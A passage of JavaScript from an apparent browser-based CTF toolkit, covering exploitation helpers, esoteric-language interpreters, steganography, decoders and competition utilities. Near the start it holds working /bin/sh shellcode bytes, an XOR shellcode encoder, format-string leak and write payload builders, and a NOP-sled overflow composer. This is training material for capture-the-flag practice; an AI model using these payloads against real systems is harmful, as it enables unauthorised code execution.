  execve64: { asm: 'xor rdx,rdx; movabs rdi,0x68732f6e69622f2f; push rdi; mov rdi,rsp; xor rsi,rsi; push rsi; push rdi; mov rsi,rsp; mov al,0x3b; syscall\n(29-byte execve("/bin/sh"), NULL argv tail + NULL envp)', hex: '4831d248bf2f2f62696e2f7368574889e74831f656574889e6b03b0f05' },
  execve32: { asm: 'xor eax,eax; push eax; push "//sh"; push "/bin"; mov ebx,esp; push eax; push ebx; mov ecx,esp; cdq; mov al,0xb; int 0x80\n(24-byte execve("/bin/sh") for x86)', hex: '31c050682f2f7368682f62696e89e3505389e199b00bcd80' },
  exit64: { asm: 'xor rdi,rdi; mov rax,60; syscall', hex: '4831ffb83c0000000f05' }
};
function renderShellcodeChoice() {
  const choice = document.getElementById('scChoice').value;
  const sc = SHELLCODES[choice];
  setOut('scBytesOutput', '<strong>' + sc.asm + '</strong>\n\nhex: ' + wrapGroups(sc.hex, 2) + '\nlength: ' + (sc.hex.length / 2) + ' bytes');
}
TOOL_INIT_HOOKS['shellcode-reference'] = renderShellcodeChoice;
function xorEncodeShellcode() {
  const choice = document.getElementById('scChoice').value;
  const keyHex = document.getElementById('scXorKey').value.trim() || '00';
  const key = parseInt(keyHex, 16) & 0xff;
  const bytes = hexToBytesArr(SHELLCODES[choice].hex);
  const encoded = Array.from(bytes).map(function (b) { return b ^ key; });
  setOutText('scEncodedOutput', 'Encoded: ' + encoded.map(function (b) { return b.toString(16).padStart(2, '0'); }).join('') +
    '\n\nDecoder stub idea: loop over the buffer XOR-ing each byte with 0x' + keyHex.padStart(2, '0') + ' before executing.');
}

function buildFmtLeakChain() {
  const slots = Math.max(1, Math.min(60, Number(document.getElementById('fmtSlots').value) || 12));
  let out = '';
  for (let i = 1; i <= slots; i++) out += '%' + i + '$p.';
  setOutText('fmtLeakOutput', out + '\n\n(Each %N$p prints the Nth variadic argument / stack slot as a pointer — send this and match the leaked addresses to a memory map.)');
}
function buildFmtWritePayload() {
  const offset = Math.max(1, Number(document.getElementById('fmtOffset').value) || 7);
  const value = Math.max(0, Number(document.getElementById('fmtValue').value) || 0);
  setOutText('fmtWriteOutput', '%' + value + 'd%' + offset + '$n\n\n(Pads ' + value + ' characters of output, then %N$n writes that count — ' + value + ' — to the pointer at stack slot ' + offset + '. For larger values, split into %hn/%hhn writes per byte to avoid huge padding.)');
}

function composeNopsledTool() {
  const nopLen = Math.max(0, Number(document.getElementById('nopLen').value) || 0);
  const retRaw = document.getElementById('nopRet').value.replace(/^0x/i, '').trim();
  const scHex = document.getElementById('nopShellcode').value.replace(/\s/g, '');
  const total = Number(document.getElementById('nopTotal').value) || 0;
  let retBytes = '';
  // Accept both a 4-byte (8 hex digit, x86) and 8-byte (16 hex digit, x86-64) return address instead of
  // silently dropping anything that isn't exactly 8 hex digits — padStart never shortens an over-long
  // address, so a real 64-bit pointer used to fail the old exact-8-char check and vanish with no warning.
  if (/^[0-9a-fA-F]{1,8}$/.test(retRaw)) {
    const b = hexToBytesArr(retRaw.padStart(8, '0'));
    retBytes = bytesToHex(Array.from(b).reverse());
  } else if (/^[0-9a-fA-F]{9,16}$/.test(retRaw)) {
    const b = hexToBytesArr(retRaw.padStart(16, '0'));
    retBytes = bytesToHex(Array.from(b).reverse());
  } else if (retRaw) {
    toast('Return address must be 1-16 hex digits — got "' + retRaw + '"', 'err');
  }
  let payload = '90'.repeat(nopLen) + scHex + retBytes;
  if (total && payload.length / 2 < total) payload += '41'.repeat(total - payload.length / 2);
  setOutText('nopOutput', wrapGroups(payload, 2) + '\n\ntotal length: ' + (payload.length / 2) + ' bytes' + (retBytes ? '' : (retRaw ? '' : '\n(no return address given)')));
}

function intOverflowTool() {
  const raw = document.getElementById('ovfValue').value.trim();
  const width = Number(document.getElementById('ovfWidth').value);
  const signed = document.getElementById('ovfSign').value === 'signed';
  let n;
  try { n = raw.toLowerCase().startsWith('0x') ? BigInt(raw) : BigInt(raw); } catch (e) { setOutText('ovfOutput', 'Enter a valid integer.'); return; }
  const mod = 1n << BigInt(width);
  let wrapped = ((n % mod) + mod) % mod;
  let display = wrapped;
  if (signed && wrapped >= mod / 2n) display = wrapped - mod;
  setOutText('ovfOutput',
    'As unsigned ' + width + '-bit: ' + wrapped + ' (0x' + wrapped.toString(16) + ')\n' +
    'As signed ' + width + '-bit: ' + display + '\n' +
    'Min/Max unsigned: 0 .. ' + (mod - 1n) + '\n' +
    'Min/Max signed:  ' + (-(mod / 2n)) + ' .. ' + (mod / 2n - 1n));
}

/* ---------------------------------------------------------------------- */
/* OSINT & MISC — catalog                                                 */
/* ---------------------------------------------------------------------- */
registerTool('misc', 'MSC', 'MSC-01', 'qrcode', 'QR Code Decode / Generate', 'Scans an uploaded QR image, or generates a new one from text.');
registerTool('misc', 'MSC', 'MSC-02', 'barcode-generator', 'Barcode Generator', 'Generates CODE128/EAN-13/etc. barcodes from text.');
registerTool('misc', 'MSC', 'MSC-03', 'brainfuck', 'Brainfuck Interpreter', 'Runs Brainfuck programs with full memory-tape inspection.');
registerTool('misc', 'MSC', 'MSC-04', 'whitespace', 'Whitespace Interpreter', 'Runs esoteric Whitespace programs (space/tab/newline only).');
registerTool('misc', 'MSC', 'MSC-05', 'zwc-steg', 'Zero-Width Character Steganography', 'Hides or reveals data encoded in invisible zero-width Unicode characters.');
registerTool('misc', 'MSC', 'MSC-06', 'magic-decoder', 'Magic Auto-Decoder', 'Tries Base64/Hex/ROT13/Binary/URL decode chains and shows the most readable result.');
registerTool('misc', 'MSC', 'MSC-07', 'unicode-inspector', 'Unicode / Homoglyph Inspector', 'Flags invisible, non-ASCII and look-alike characters hiding in text.');
registerTool('misc', 'MSC', 'MSC-08', 'timestamp', 'Timestamp Converter', 'Unix epoch ↔ human-readable date, in any timezone offset.');
registerTool('misc', 'MSC', 'MSC-09', 'ip-subnet', 'IP / CIDR Calculator', 'Network address, broadcast, host range and mask math for IPv4 CIDR blocks.');
registerTool('misc', 'MSC', 'MSC-10', 'flag-checker', 'Flag Format Checker', 'Validates a candidate flag against a configurable flag{...} pattern.');

const MISC_INTERFACES = {
  qrcode: function () {
    return ui_field('Decode: upload a QR code image', '<input type="file" id="qrFile" accept="image/*">') +
      ui_btns([{ label: 'Decode', onclick: 'decodeQrTool()', primary: true }]) +
      ui_field('Decoded text', ui_out('qrDecodeOutput')) +
      ui_field('Generate: text to encode', ui_textarea('qrGenInput', 2, 'Text or URL')) +
      ui_btns([{ label: 'Generate QR code', onclick: 'generateQrTool()' }]) +
      '<div id="qrGenCanvas"></div>';
  },
  'barcode-generator': function () {
    return ui_field('Text / number to encode', '<input type="text" id="barcodeInput" placeholder="123456789012">') +
      '<div class="field"><label>Format</label><select id="barcodeFormat"><option value="CODE128">CODE128</option><option value="EAN13">EAN-13</option><option value="UPC">UPC</option><option value="CODE39">CODE39</option></select></div>' +
      ui_btns([{ label: 'Generate', onclick: 'generateBarcodeTool()', primary: true }]) +
      '<svg id="barcodeSvg" style="margin-top:0.6rem"></svg>';
  },
  brainfuck: function () {
    return ui_field('Brainfuck code', ui_textarea('bfCode', 5, '++++++++[>++++[>++>+++>+++>+<<<<-]>+>+>->>+[<]<-]>>.>---.+++++++..+++.>>.<-.<.+++.------.--------.>>+.>++.')) +
      ui_field('Input (for , instruction)', '<input type="text" id="bfInput" placeholder="optional stdin">') +
      ui_btns([
        { label: 'Run', onclick: 'runBrainfuckTool()', primary: true },
        { label: 'Load hello-world example', onclick: 'loadBfExample()' },
        { label: 'Clear', onclick: "clearIO('bfCode','bfOutput')" }
      ]) + ui_field('Output', ui_out('bfOutput')) + ui_field('Final tape (first 32 cells)', ui_out('bfTapeOutput'));
  },
  whitespace: function () {
    return ui_field('Whitespace source (paste as-is — tabs/spaces/newlines matter, visualized below as S/T/N)', ui_textarea('wsCode', 5, '')) +
      ui_field('Input (for the read-char/read-num instructions, optional)', '<input type="text" id="wsInput" placeholder="optional stdin">') +
      ui_btns([{ label: 'Run', onclick: 'runWhitespaceTool()', primary: true }, { label: 'Load example (prints 1)', onclick: 'loadWsExample()' }]) +
      ui_field('Visualized source', ui_out('wsVizOutput')) +
      ui_field('Output', ui_out('wsOutput'));
  },
  'zwc-steg': function () {
    return ui_field('Cover text (visible)', ui_textarea('zwcCover', 2, 'This looks like a normal sentence.')) +
      ui_field('Secret to hide', '<input type="text" id="zwcSecret" placeholder="flag{hidden}">') +
      ui_btns([{ label: 'Hide inside cover text', onclick: 'zwcHideTool()', primary: true }]) +
      ui_field('Output (copy this — looks identical to the cover text but carries hidden data)', ui_out('zwcHideOutput')) +
      ui_field('Reveal: paste suspicious text', ui_textarea('zwcReveal', 3, 'Paste text that might hide zero-width characters')) +
      ui_btns([{ label: 'Reveal hidden data', onclick: 'zwcRevealTool()' }]) + ui_field('Revealed', ui_out('zwcRevealOutput'));
  },
  'magic-decoder': function () {
    return ui_field('Mystery data', ui_textarea('magicInput', 5, 'Paste anything you suspect is encoded')) +
      ui_btns([{ label: 'Auto-decode', onclick: 'magicDecodeTool()', primary: true }]) +
      ui_field('Attempts, best first', ui_out('magicOutput'));
  },
  'unicode-inspector': function () {
    return ui_field('Text to inspect', ui_textarea('uniInput', 5, 'Paste text that might contain hidden/look-alike characters')) +
      ui_btns([{ label: 'Inspect', onclick: 'inspectUnicodeTool()', primary: true }]) +
      ui_field('Report', ui_out('uniOutput'));
  },
  timestamp: function () {
    return ui_field('Unix timestamp (seconds or ms)', '<input type="text" id="tsInput" placeholder="1700000000">') +
      ui_btns([{ label: 'Convert → date', onclick: 'tsToDateTool()', primary: true }]) +
      ui_field('Or a date/time', '<input type="text" id="dateInput" placeholder="2024-01-15T12:00:00Z">') +
      ui_btns([{ label: 'Convert → timestamp', onclick: 'dateToTsTool()' }, { label: 'Use current time', onclick: 'useNowTool()' }]) +
      ui_field('Result', ui_out('tsOutput'));
  },
  'ip-subnet': function () {
    return ui_field('CIDR (e.g. 192.168.1.0/24)', '<input type="text" id="cidrInput" placeholder="192.168.1.10/24">') +
      ui_btns([{ label: 'Calculate', onclick: 'calcSubnetTool()', primary: true }]) +
      ui_field('Result', ui_out('subnetOutput'));
  },
  'flag-checker': function () {
    return ui_field('Flag pattern (regex, {} wildcard shown below)', '<input type="text" id="flagPattern" value="flag\\{[\\w!@#$%^&*()\\-+=]+\\}">') +
      ui_field('Candidate to check', '<input type="text" id="flagCandidate" placeholder="flag{th1s_1s_4_t3st}">') +
      ui_btns([{ label: 'Check', onclick: 'checkFlagTool()', primary: true }]) +
      ui_field('Result', ui_out('flagOutput'));
  }
};

async function decodeQrTool() {
  const f = document.getElementById('qrFile').files[0];
  if (!f) { toast('Choose an image first', 'err'); return; }
  try {
    const { ctx, width, height } = await loadImageToCanvas(f);
    const data = ctx.getImageData(0, 0, width, height);
    const result = jsQR(data.data, width, height);
    setOutText('qrDecodeOutput', result ? result.data : 'No QR code detected in this image.');
  } catch (e) { setOutText('qrDecodeOutput', 'Error: ' + e.message); }
}
function generateQrTool() {
  const text = document.getElementById('qrGenInput').value;
  if (!text) { toast('Enter text to encode', 'err'); return; }
  const host = document.getElementById('qrGenCanvas');
  host.innerHTML = '';
  new QRCode(host, { text: text, width: 200, height: 200 });
}
function generateBarcodeTool() {
  const text = document.getElementById('barcodeInput').value;
  const fmt = document.getElementById('barcodeFormat').value;
  if (!text) { toast('Enter a value to encode', 'err'); return; }
  try { JsBarcode('#barcodeSvg', text, { format: fmt, displayValue: true, background: '#ffffff', lineColor: '#000000', margin: 12 }); }
  catch (e) { toast('Could not encode as ' + fmt + ': ' + e.message, 'err'); }
}

function runBrainfuckInterpreter(code, input) {
  const tape = new Uint8Array(30000);
  let ptr = 0, out = '', inPtr = 0;
  const jumpMap = {};
  const stack = [];
  for (let i = 0; i < code.length; i++) {
    if (code[i] === '[') stack.push(i);
    else if (code[i] === ']') { const open = stack.pop(); jumpMap[open] = i; jumpMap[i] = open; }
  }
  let steps = 0;
  for (let i = 0; i < code.length; i++) {
    if (++steps > 2000000) { out += '\n[stopped — exceeded 2,000,000 steps, possible infinite loop]'; break; }
    switch (code[i]) {
      case '>': ptr = (ptr + 1) % tape.length; break;
      case '<': ptr = (ptr - 1 + tape.length) % tape.length; break;
      case '+': tape[ptr] = (tape[ptr] + 1) & 255; break;
      case '-': tape[ptr] = (tape[ptr] - 1 + 256) & 255; break;
      case '.': out += String.fromCharCode(tape[ptr]); break;
      case ',': tape[ptr] = inPtr < input.length ? input.charCodeAt(inPtr++) : 0; break;
      case '[': if (tape[ptr] === 0) i = jumpMap[i]; break;
      case ']': if (tape[ptr] !== 0) i = jumpMap[i]; break;
    }
  }
  return { out: out, tape: tape };
}
function runBrainfuckTool() {
  const code = document.getElementById('bfCode').value;
  const input = document.getElementById('bfInput').value;
  try {
    const { out, tape } = runBrainfuckInterpreter(code, input);
    setOutText('bfOutput', out || '(no output)');
    setOutText('bfTapeOutput', Array.from(tape.slice(0, 32)).join(' '));
  } catch (e) { setOutText('bfOutput', 'Error: ' + e.message); }
}
function loadBfExample() {
  document.getElementById('bfCode').value = '++++++++[>++++[>++>+++>+++>+<<<<-]>+>+>->>+[<]<-]>>.>---.+++++++..+++.>>.<-.<.+++.------.--------.>>+.>++.';
}

/* Whitespace interpreter, matching the real instruction set (tim.whitespace.es):
     IMP               command                 full sequence
     [Space]           push <num>              "  "   (+ number literal)
     [Space]           [LF][Space] dup         " \n "
     [Space]           [LF][Tab]   swap        " \n\t"
     [Space]           [LF][LF]    discard     " \n\n"
     [Tab][Space]       [Space][Space] add      "\t   "
     [Tab][Space]       [Space][Tab]   sub      "\t  \t"
     [Tab][Space]       [Space][LF]    mul      "\t  \n"
     [Tab][Space]       [Tab][Space]   div      "\t \t "
     [Tab][Space]       [Tab][Tab]     mod      "\t \t\t"
     [Tab][Tab]         [Space]  store          "\t\t "
     [Tab][Tab]         [Tab]    retrieve       "\t\t\t"
     [Tab][LF]          [Space][Space] out-char "\t\n  "
     [Tab][LF]          [Space][Tab]   out-num  "\t\n \t"
     [Tab][LF]          [Tab][Space]   in-char  "\t\n\t "
     [Tab][LF]          [Tab][Tab]     in-num   "\t\n\t\t"
     [LF]               [Space][Space] label    "\n  "  (+ label literal)
     [LF]               [Space][Tab]   call     "\n \t" (+ label literal)
     [LF]               [Space][LF]    jmp      "\n \n" (+ label literal)
     [LF]               [Tab][Space]   jz       "\n\t " (+ label literal)
     [LF]               [Tab][Tab]     jn       "\n\t\t"(+ label literal)
     [LF]               [Tab][LF]      return   "\n\t\n"
     [LF]               [LF][LF]       end      "\n\n\n" (loop breaks on the 2-char prefix, which is unambiguous)
   The previous version had call and jz's bit patterns swapped with each other, used an invented,
   spec-incorrect pattern for discard with swap entirely unimplemented, under-consumed the I/O
   commands by one character (desyncing the token stream for anything after them), and had no
   div/mod/jn/read branches at all. All of that is fixed here. */
function runWhitespaceInterpreter(src, stdin) {
  const tokens = src.replace(/[^ \t\n]/g, '');
  let i = 0, out = '', inPos = 0;
  const input = stdin || '';
  const stack = [];
  const heap = {};
  const labels = {};
  const callStack = [];
  function readLabel() {
    let l = '';
    while (i < tokens.length && tokens[i] !== '\n') { l += tokens[i] === ' ' ? '0' : '1'; i++; }
    i++;
    return l;
  }
  function readNumber() {
    const sign = tokens[i] === '\t' ? -1 : 1; i++;
    let bits = '';
    while (i < tokens.length && tokens[i] !== '\n') { bits += tokens[i] === ' ' ? '0' : '1'; i++; }
    i++;
    return sign * (bits ? parseInt(bits, 2) : 0);
  }
  // pre-scan labels
  let scan = 0;
  while (scan < tokens.length) {
    if (tokens.substr(scan, 3) === '\n  ') {
      let j = scan + 3, l = '';
      while (j < tokens.length && tokens[j] !== '\n') { l += tokens[j] === ' ' ? '0' : '1'; j++; }
      labels[l] = scan + 3;
    }
    scan++;
  }
  function jumpTo(label) { return labels[label] !== undefined ? labels[label] : tokens.length; }
  let steps = 0;
  while (i < tokens.length) {
    if (++steps > 500000) { out += '\n[stopped — too many steps]'; break; }
    if (tokens.substr(i, 2) === '  ') { i += 2; stack.push(readNumber()); continue; } // push
    if (tokens.substr(i, 3) === ' \n ') { i += 3; stack.push(stack[stack.length - 1]); continue; } // dup
    if (tokens.substr(i, 3) === ' \n\t') { i += 3; const b = stack.pop(), a = stack.pop(); stack.push(b, a); continue; } // swap
    if (tokens.substr(i, 3) === ' \n\n') { i += 3; stack.pop(); continue; } // discard
    if (tokens.substr(i, 2) === '\t ') { // arithmetic
      const op = tokens.substr(i + 2, 2);
      if (op === '  ') { i += 4; const b = stack.pop(), a = stack.pop(); stack.push(a + b); continue; }
      if (op === ' \t') { i += 4; const b = stack.pop(), a = stack.pop(); stack.push(a - b); continue; }
      if (op === ' \n') { i += 4; const b = stack.pop(), a = stack.pop(); stack.push(a * b); continue; }
      if (op === '\t ') { i += 4; const b = stack.pop(), a = stack.pop(); stack.push(b === 0 ? 0 : Math.trunc(a / b)); continue; } // div
      if (op === '\t\t') { i += 4; const b = stack.pop(), a = stack.pop(); stack.push(b === 0 ? 0 : ((a % b) + b) % b); continue; } // mod
    }
    if (tokens.substr(i, 3) === '\t\t ') { i += 3; heap[stack[stack.length - 2]] = stack[stack.length - 1]; stack.length -= 2; continue; } // store
    if (tokens.substr(i, 3) === '\t\t\t') { i += 3; const a = stack.pop(); stack.push(heap[a] || 0); continue; } // retrieve
    if (tokens.substr(i, 2) === '\t\n') { // I/O — full 4-char instructions, not 3
      const cmd = tokens.substr(i + 2, 2);
      if (cmd === '  ') { i += 4; out += String.fromCharCode(stack.pop()); continue; } // out-char
      if (cmd === ' \t') { i += 4; out += String(stack.pop()); continue; } // out-num
      if (cmd === '\t ') { i += 4; const addr = stack.pop(); heap[addr] = inPos < input.length ? input.charCodeAt(inPos++) : 0; continue; } // in-char
      if (cmd === '\t\t') { // in-num
        i += 4; const addr = stack.pop();
        const m = input.slice(inPos).match(/^-?\d+/);
        if (m) { inPos += m[0].length; heap[addr] = parseInt(m[0], 10); } else heap[addr] = 0;
        continue;
      }
    }
    if (tokens.substr(i, 2) === '\n\n') { break; } // end program — 3rd char is always the matching LF, loop ends anyway
    if (tokens.substr(i, 3) === '\n  ') { i += 3; readLabel(); continue; } // label def (already scanned)
    if (tokens.substr(i, 3) === '\n \t') { i += 3; const l = readLabel(); callStack.push(i); i = jumpTo(l); continue; } // call
    if (tokens.substr(i, 3) === '\n\t\n') { i = callStack.pop(); continue; } // return
    if (tokens.substr(i, 3) === '\n \n') { i += 3; const l = readLabel(); i = jumpTo(l); continue; } // jmp
    if (tokens.substr(i, 3) === '\n\t ') { i += 3; const l = readLabel(); const v = stack.pop(); if (v === 0) i = jumpTo(l); continue; } // jz
    if (tokens.substr(i, 3) === '\n\t\t') { i += 3; const l = readLabel(); const v = stack.pop(); if (v < 0) i = jumpTo(l); continue; } // jn
    i++; // unknown sequence, skip a token defensively
  }
  return out;
}
function runWhitespaceTool() {
  const code = document.getElementById('wsCode').value;
  const stdinEl = document.getElementById('wsInput');
  try { setOutText('wsOutput', runWhitespaceInterpreter(code, stdinEl ? stdinEl.value : '') || '(no output)'); }
  catch (e) { setOutText('wsOutput', 'Error: ' + e.message); }
  setOutText('wsVizOutput', code.replace(/ /g, 'S').replace(/\t/g, 'T').replace(/\n/g, 'N\n'));
}
function loadWsExample() {
  // push 1 (S S S T L), print as number (T L S T), end program (L L L) — corrected to the real
  // 4-character I/O instruction length; the previous 3-character version only "worked" because the
  // interpreter used to under-consume I/O instructions by one character too (now fixed).
  document.getElementById('wsCode').value = '   \t\n\t\n \t\n\n\n';
}

/* --- Zero-width character steganography --- */
const ZWC = { '0': '​', '1': '‌', sep: '‍' };
function zwcHideTool() {
  const cover = document.getElementById('zwcCover').value;
  const secret = document.getElementById('zwcSecret').value;
  if (!cover || !secret) { toast('Fill in both fields', 'err'); return; }
  const bytes = new TextEncoder().encode(secret);
  let encoded = '';
  bytes.forEach(function (b) {
    const bits = b.toString(2).padStart(8, '0');
    for (const bit of bits) encoded += ZWC[bit];
  });
  setOutText('zwcHideOutput', cover + ZWC.sep + encoded);
}
function zwcRevealTool() {
  const text = document.getElementById('zwcReveal').value;
  const zeros = (text.match(/​/g) || []).length;
  const ones = (text.match(/‌/g) || []).length;
  if (!zeros && !ones) { setOutText('zwcRevealOutput', 'No zero-width binary data detected.'); return; }
  const hidden = text.split('').filter(function (c) { return c === '​' || c === '‌'; }).map(function (c) { return c === '​' ? '0' : '1'; }).join('');
  const bytes = [];
  for (let i = 0; i + 8 <= hidden.length; i += 8) bytes.push(parseInt(hidden.substr(i, 8), 2));
  setOutText('zwcRevealOutput', new TextDecoder().decode(new Uint8Array(bytes)) + '\n\n(' + bytes.length + ' bytes decoded from ' + (zeros + ones) + ' zero-width characters)');
}

/* --- Magic auto-decoder: layered heuristic decode chain --- */
function tryDecodeOnce(input) {
  const attempts = [];
  // base64
  if (/^[A-Za-z0-9+/\s]+=*$/.test(input) && input.replace(/\s/g, '').length % 4 === 0 && input.replace(/\s/g, '').length > 0) {
    try { attempts.push({ label: 'Base64', value: decodeURIComponent(escape(atob(input.replace(/\s/g, '')))) }); } catch (e) {}
  }
  // hex
  if (/^[0-9a-fA-F\s]+$/.test(input) && input.replace(/\s/g, '').length % 2 === 0 && input.replace(/\s/g, '').length > 0) {
    try { attempts.push({ label: 'Hex', value: new TextDecoder().decode(hexToBytesArr(input)) }); } catch (e) {}
  }
  // binary
  if (/^[01\s]+$/.test(input) && input.replace(/\s/g, '').length >= 8) {
    try {
      const bits = input.replace(/\s/g, '');
      const bytes = []; for (let i = 0; i + 8 <= bits.length; i += 8) bytes.push(parseInt(bits.substr(i, 8), 2));
      attempts.push({ label: 'Binary', value: new TextDecoder().decode(new Uint8Array(bytes)) });
    } catch (e) {}
  }
  // url
  if (/%[0-9a-fA-F]{2}/.test(input)) { try { attempts.push({ label: 'URL decode', value: decodeURIComponent(input) }); } catch (e) {} }
  // rot13
  attempts.push({ label: 'ROT13', value: caesarShift(input, 13) });
  // reverse
  attempts.push({ label: 'Reversed', value: input.split('').reverse().join('') });
  return attempts;
}
function magicDecodeTool() {
  let input = document.getElementById('magicInput').value.trim();
  const tried = new Set([input]);
  let best = { label: 'original', value: input, score: printableScore(new TextEncoder().encode(input)) };
  const report = [];
  let frontier = [input];
  for (let depth = 0; depth < 3 && frontier.length; depth++) {
    const next = [];
    frontier.forEach(function (text) {
      tryDecodeOnce(text).forEach(function (a) {
        if (tried.has(a.value) || !a.value) return;
        tried.add(a.value);
        const score = printableScore(new TextEncoder().encode(a.value));
        report.push({ depth: depth + 1, label: a.label, value: a.value, score: score });
        next.push(a.value);
      });
    });
    frontier = next;
  }
  report.sort(function (a, b) { return b.score - a.score; });
  if (!report.length) { setOutText('magicOutput', 'No decode layer produced a different result.'); return; }
  setOutText('magicOutput', report.slice(0, 12).map(function (r) {
    return '[depth ' + r.depth + ', ' + r.label + ', score ' + r.score.toFixed(2) + ']  ' + r.value.slice(0, 300);
  }).join('\n\n'));
}

function inspectUnicodeTool() {
  const text = document.getElementById('uniInput').value;
  const invisible = [0x200b, 0x200c, 0x200d, 0x2060, 0xfeff];
  // bidi-control characters are a classic disguise/spoofing technique (e.g. renaming "evil.exe"
  // so it DISPLAYS as "evilexe.txt") and deserve their own flag, not a generic non-ASCII count.
  const bidiControls = [0x202a, 0x202b, 0x202c, 0x202d, 0x202e, 0x2066, 0x2067, 0x2068, 0x2069];
  const findings = [];
  let invisCount = 0, bidiCount = 0, nonAsciiCount = 0;
  Array.from(text).forEach(function (ch, idx) {
    const cp = ch.codePointAt(0);
    if (invisible.includes(cp)) invisCount++;
    else if (bidiControls.includes(cp)) bidiCount++;
    else if (cp > 127) nonAsciiCount++;
  });
  if (invisCount) findings.push(['bad', invisCount + ' invisible zero-width character(s) found — try the Zero-Width Character tool to reveal them.']);
  if (bidiCount) findings.push(['bad', bidiCount + ' bidirectional-override character(s) found (e.g. U+202E RIGHT-TO-LEFT OVERRIDE) — a classic trick for disguising a filename or string\'s true content/extension.']);
  if (nonAsciiCount) findings.push(['warn', nonAsciiCount + ' non-ASCII character(s) — check for homoglyphs (е vs e, а vs a, etc.) used to disguise text.']);
  const homoglyphPairs = [['а', 'a'], ['е', 'e'], ['о', 'o'], ['р', 'p'], ['с', 'c'], ['х', 'x'], ['і', 'i']];
  homoglyphPairs.forEach(function (pair) { if (text.includes(pair[0])) findings.push(['warn', 'Contains Cyrillic look-alike "' + pair[0] + '" (looks like Latin "' + pair[1] + '")']); });
  if (!findings.length) findings.push(['good', 'No invisible characters or common homoglyphs detected.']);
  setOut('uniOutput', findings.map(function (f) { return '<span class="badge ' + f[0] + '">' + f[0].toUpperCase() + '</span> ' + f[1]; }).join('<br><br>') +
    '<div class="hint">Codepoints: ' + Array.from(text).slice(0, 80).map(function (c) { return 'U+' + c.codePointAt(0).toString(16).toUpperCase().padStart(4, '0'); }).join(' ') + (text.length > 80 ? ' …' : '') + '</div>');
}

function tsToDateTool() {
  let v = document.getElementById('tsInput').value.trim();
  let n = Number(v);
  if (!Number.isFinite(n)) { setOutText('tsOutput', 'Enter a numeric timestamp.'); return; }
  if (String(v).length <= 10) n *= 1000;
  const d = new Date(n);
  if (isNaN(d.getTime())) { setOutText('tsOutput', 'Not a valid timestamp.'); return; }
  setOutText('tsOutput', 'UTC:   ' + d.toUTCString() + '\nISO:   ' + d.toISOString() + '\nLocal: ' + d.toString());
}
function dateToTsTool() {
  const v = document.getElementById('dateInput').value.trim();
  const d = new Date(v);
  if (isNaN(d.getTime())) { setOutText('tsOutput', 'Could not parse that date — try ISO 8601 like 2024-01-15T12:00:00Z.'); return; }
  setOutText('tsOutput', 'Unix seconds: ' + Math.floor(d.getTime() / 1000) + '\nUnix ms: ' + d.getTime());
}
function useNowTool() { document.getElementById('dateInput').value = new Date().toISOString(); dateToTsTool(); }

function calcSubnetTool() {
  const input = document.getElementById('cidrInput').value.trim();
  const m = input.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})\/(\d{1,2})$/);
  if (!m) { setOutText('subnetOutput', 'Enter an IPv4 CIDR like 192.168.1.10/24.'); return; }
  const octets = m.slice(1, 5).map(Number);
  if (octets.some(function (o) { return o > 255; })) { setOutText('subnetOutput', 'Octets must be 0–255.'); return; }
  const prefix = Number(m[5]);
  if (prefix < 0 || prefix > 32) { setOutText('subnetOutput', 'Prefix must be 0–32.'); return; }
  const ipInt = (octets[0] << 24 | octets[1] << 16 | octets[2] << 8 | octets[3]) >>> 0;
  const maskInt = prefix === 0 ? 0 : (0xffffffff << (32 - prefix)) >>> 0;
  const network = ipInt & maskInt;
  const broadcast = (network | (~maskInt >>> 0)) >>> 0;
  function toIp(n) { return [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.'); }
  const hostCount = prefix >= 31 ? 0 : (2 ** (32 - prefix)) - 2;
  setOut('subnetOutput', '<table class="kv-table">' +
    '<tr><td>Network</td><td>' + toIp(network) + '/' + prefix + '</td></tr>' +
    '<tr><td>Netmask</td><td>' + toIp(maskInt) + '</td></tr>' +
    '<tr><td>Broadcast</td><td>' + toIp(broadcast) + '</td></tr>' +
    '<tr><td>First usable host</td><td>' + (hostCount > 0 ? toIp(network + 1) : '—') + '</td></tr>' +
    '<tr><td>Last usable host</td><td>' + (hostCount > 0 ? toIp(broadcast - 1) : '—') + '</td></tr>' +
    '<tr><td>Usable hosts</td><td>' + Math.max(0, hostCount) + '</td></tr>' +
    '</table>');
}

function checkFlagTool() {
  const patternStr = document.getElementById('flagPattern').value;
  const candidate = document.getElementById('flagCandidate').value;
  try {
    const re = new RegExp('^' + patternStr + '$', 'i');
    const ok = re.test(candidate);
    setOut('flagOutput', '<span class="badge ' + (ok ? 'good' : 'bad') + '">' + (ok ? 'Matches the pattern' : 'Does not match') + '</span>');
  } catch (e) { setOutText('flagOutput', 'Invalid pattern: ' + e.message); }
}

/* ---------------------------------------------------------------------- */
/* COMPETITION UTILITIES — catalog                                        */
/* ---------------------------------------------------------------------- */
registerTool('utils', 'UTL', 'UTL-01', 'challenge-tracker', 'Challenge Tracker', 'Track CTF challenges, points and solve status — saved in this browser.');
registerTool('utils', 'UTL', 'UTL-02', 'notes', 'Scratchpad Notes', 'A persistent notes area for working through a challenge, saved locally.');
registerTool('utils', 'UTL', 'UTL-03', 'timer', 'Competition Timer', 'Countdown to a competition end time, plus a per-challenge stopwatch.');
registerTool('utils', 'UTL', 'UTL-04', 'writeup-generator', 'Writeup Template Generator', 'Produces a ready-to-fill Markdown writeup skeleton.');
registerTool('utils', 'UTL', 'UTL-05', 'wordlist-generator', 'Wordlist Generator', 'Builds targeted password-guess wordlists from seed words (leetspeak, years, casing).');
registerTool('utils', 'UTL', 'UTL-06', 'text-diff', 'Text Diff', 'Line-by-line diff between two blobs of text.');

const UTILS_INTERFACES = {
  'challenge-tracker': function () {
    return '<div id="ctWrap"></div>' +
      ui_field('Add a challenge', '<div class="row3"><input type="text" id="ctName" placeholder="Challenge name"><input type="text" id="ctCat" placeholder="Category (web, pwn…)"><input type="number" id="ctPoints" placeholder="Points" value="100"></div>') +
      ui_btns([{ label: 'Add challenge', onclick: 'ctAdd()', primary: true }]);
  },
  notes: function () {
    return ui_field('Notes (auto-saved as you type)', '<textarea id="notesArea" rows="14" placeholder="Scratch notes for the current challenge…" oninput="notesSave()"></textarea>') +
      ui_btns([{ label: 'Download as .txt', onclick: 'notesDownload()' }, { label: 'Clear', onclick: 'notesClear()' }]);
  },
  timer: function () {
    return ui_field('Competition end time', '<input type="datetime-local" id="timerEnd">') +
      ui_btns([{ label: 'Start countdown', onclick: 'timerStartCountdown()', primary: true }]) +
      '<div id="timerCountdownOutput" class="out" style="font-size:1.3rem"></div>' +
